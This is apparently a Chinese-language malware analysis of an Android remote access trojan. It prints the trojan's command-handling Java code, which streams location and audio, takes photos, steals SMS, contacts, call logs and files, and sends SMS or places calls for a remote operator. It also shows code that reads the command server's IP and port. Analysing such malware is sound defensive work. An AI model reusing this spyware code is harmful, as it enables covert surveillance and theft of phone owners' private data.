
# 方法分析

```java
public void process(short cmd, byte[] args, int chan)
{
    this.commande = cmd;
    this.chan = chan;
    this.arguments = ByteBuffer.wrap(args);

    if (commande == Protocol.GET_GPS_STREAM)
    {
        String provider = new String(arguments.array());

        if (provider.compareTo("network") == 0 || provider.compareTo("gps") == 0) {
            client.gps = new GPSListener(client, provider, chan);
            client.sendInformation("Location request received");
        }
        else
            client.sendError("Unknown provider '"+provider+"' for location");

    } else if (commande == Protocol.STOP_GPS_STREAM)
    {
        client.gps.stop();
        client.gps = null;
        client.sendInformation("Location stopped");

    } else if (commande == Protocol.GET_SOUND_STREAM)
    {
        client.sendInformation("Audio streaming request received");
        client.audioStreamer = new AudioStreamer(client, arguments.getInt(), chan);
        client.audioStreamer.run();

    } else if (commande == Protocol.STOP_SOUND_STREAM)
    {
        client.audioStreamer.stop();
        client.audioStreamer = null;
        client.sendInformation("Audio streaming stopped");

    } else if (commande == Protocol.GET_CALL_LOGS)
    {
        client.sendInformation("Call log request received");
        if (!CallLogLister.listCallLog(client, chan, arguments.array()))
            client.sendError("No call logs");

    } else if (commande == Protocol.MONITOR_CALL)
    {
        client.sendInformation("Start monitoring call");
        client.callMonitor = new CallMonitor(client, chan, arguments.array());

    } else if (commande == Protocol.STOP_MONITOR_CALL)
    {
        client.callMonitor.stop();
        client.callMonitor = null;
        client.sendInformation("Call monitoring stopped");

    } else if (commande == Protocol.GET_CONTACTS)
    {
        client.sendInformation("Contacts request received");
        if (!ContactsLister.listContacts(client, chan, arguments.array()))
            client.sendError("No contact to return");

    } else if (commande == Protocol.LIST_DIR)
    {
        client.sendInformation("List directory request received");
        String file = new String(arguments.array());
        if (!DirLister.listDir(client, chan, file))
            client.sendError("Directory: "+file+" not found");

    } else if (commande == Protocol.GET_FILE)
    {
        String file = new String(arguments.array());
        client.sendInformation("Download file "+file+" request received");
        client.fileDownloader = new FileDownloader(client);
        client.fileDownloader.downloadFile(file, chan);

    } else if (commande == Protocol.GET_PICTURE)
    {
        client.sendInformation("Photo picture request received");
        //if(client instanceof Client)
        //  client.sendError("Photo requested from a service (it will probably not work)");
        client.photoTaker = new PhotoTaker(client, chan);
        if (!client.photoTaker.takePhoto())
            client.sendError("Something went wrong while taking the picture");

    } else if (commande == Protocol.DO_TOAST)
    {
        client.toast = Toast.makeText(client, new String(arguments.array()), Toast.LENGTH_LONG);
        client.toast.show();

    } else if (commande == Protocol.SEND_SMS)
    {
        Map<String, String> information = EncoderHelper.decodeHashMap(arguments.array());
        String num = information.get(Protocol.KEY_SEND_SMS_NUMBER);
        String text = information.get(Protocol.KEY_SEND_SMS_BODY);
        if (text.getBytes().length < 167)
            SmsManager.getDefault().sendTextMessage(num, null, text, null, null);
        else
        {
            ArrayList<String> multipleMsg = MessageDecoupator(text);
            SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);
        }
        client.sendInformation("SMS sent");

    } else if (commande == Protocol.GIVE_CALL)
    {
         String uri = "tel:" + new String(arguments.array()) ;
         intent = new Intent(Intent.ACTION_CALL,Uri.parse(uri));
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         client.startActivity(intent);

    } else if (commande == Protocol.GET_SMS)
    {
        client.sendInformation("SMS list request received");
        if(!SMSLister.listSMS(client, chan, arguments.array()))
            client.sendError("No SMS match for filter");

    } else if (commande == Protocol.MONITOR_SMS)
    {
        client.sendInformation("Start SMS monitoring");
        client.smsMonitor = new SMSMonitor(client, chan, arguments.array());

    } else if (commande == Protocol.STOP_MONITOR_SMS)
    {
        client.smsMonitor.stop();
        client.smsMonitor = null;
        client.sendInformation("SMS monitoring stopped");
    }
    else if (commande == Protocol.GET_PREFERENCE)
    {
        client.handleData(chan, loadPreferences().build());
    }
    else if (commande == Protocol.SET_PREFERENCE)
    {
        client.sendInformation("Preferences received");
        savePreferences(arguments.array());
        client.loadPreferences(); //Reload the new config for the client
    }
    else if(commande == Protocol.GET_ADV_INFORMATIONS) {
        client.advancedInfos = new AdvancedSystemInfo(client, chan);
        client.advancedInfos.getInfos();
    }
    else if(commande == Protocol.OPEN_BROWSER) {
         String url = new String(arguments.array()) ;
         Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
         i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         client.startActivity(i);
    }
    else if(commande == Protocol.DO_VIBRATE) {
        Vibrator v = (Vibrator) client.getSystemService(Context.VIBRATOR_SERVICE);
        long duration = arguments.getLong();
        v.vibrate(duration);

    }
    else if(commande == Protocol.DISCONNECT) {
        client.onDestroy();
    }
    else {
        client.sendError("Command: "+commande+" unknown");
    }

}
```

最后调用了`loadPreferences`方法

```java
public void loadPreferences() {
    PreferencePacket p = procCmd.loadPreferences();
    waitTrigger = p.isWaitTrigger();
    ip = p.getIp();
    port = p.getPort();
    authorizedNumbersCall = p.getPhoneNumberCall();
    authorizedNumbersSMS = p.getPhoneNumberSMS();
    authorizedNumbersKeywords = p.getKeywordSMS();
}
```

可以看到这里获取初始化的一些参数，而这些参数就是我们在`LauncherActivity`上看到的一些参数，像`ip`和`port`。

## `onStartCommand` 方法

分析完`onCreate`方法之后，我们来看看`onStartCommand`方法：

主要的逻辑流程其实就是下图：

![](https://bbs.kanxue.com/upload/attach/201609/626792_3dc5ebbfdf7c401a.png)

最理想的情况最后应该到达的地方是`waitInstruction`方法。

```java
if(intent == null)
    return START_STICKY;
String who = intent.getAction();
Log.i(TAG, "onStartCommand by: "+ who);

if (intent.hasExtra("IP"))
    this.ip = intent.getExtras().getString("IP");
if (intent.hasExtra("PORT"))
    this.port = intent.getExtras().getInt("PORT");
```

首先是从`intent`获取`ip`和端口
